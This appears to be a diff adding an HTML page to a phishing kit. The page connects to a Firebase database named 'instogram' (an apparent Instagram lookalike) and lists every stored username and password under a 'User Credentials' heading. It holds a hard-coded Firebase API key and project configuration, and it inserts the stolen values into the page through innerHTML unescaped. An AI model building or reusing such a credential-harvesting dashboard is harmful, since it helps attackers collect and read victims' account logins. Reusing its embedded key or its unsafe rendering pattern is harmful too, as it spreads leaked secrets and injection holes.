@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Passwords</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <h1>User Credentials</h1>
+    <ul id="credentialList" class="credential-list"></ul>
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+  <script>
+    // Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyAg_c2sIlqohIwHTQ8TGuT7a8qycTCFzbI",
+        authDomain: "instogram-15d4c.firebaseapp.com",
+        databaseURL: "https://instogram-15d4c-default-rtdb.firebaseio.com",
+        projectId: "instogram-15d4c",
+        storageBucket: "instogram-15d4c.appspot.com",
+        messagingSenderId: "781739855234",
+        appId: "1:781739855234:web:00a48d4830ea17877b139b"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+
+    // Reference to Firebase Realtime Database
+    const database = firebase.database();
+    const credentialList = document.getElementById("credentialList");
+
+    // Read data from Firebase and populate the credential list
+    database.ref("cred").on("value", (snapshot) => {
+      credentialList.innerHTML = "";
+      snapshot.forEach((childSnapshot) => {
+        const credential = childSnapshot.val();
+        const li = document.createElement("li");
+        li.innerHTML = `
+          <div class="credential-item">
+            <div class="credential-detail">Username: ${credential.username}</div>
+            <div class="credential-detail">Password: ${credential.password}</div>
+          </div>
+        `;
+        credentialList.appendChild(li);
+      });
+    });
+  </script>
+</body>
+</html>
